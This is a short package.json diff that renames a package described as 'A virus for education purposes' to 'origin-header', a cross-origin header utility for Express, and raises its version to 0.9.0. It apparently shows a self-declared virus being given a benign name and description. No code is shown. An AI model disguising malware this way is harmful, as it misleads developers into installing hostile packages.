@@ -1,7 +1,7 @@
 {
-  "name": "virus-f",
-  "version": "0.0.1",
-  "description": "A virus for education purposes",
+  "name": "origin-header",
+  "version": "0.9.0",
+  "description": "Inject a cross origin header to your express server",
   "dependencies": {
     "js-beautify": "1.6.4",
     "walk" : "2.3.9"
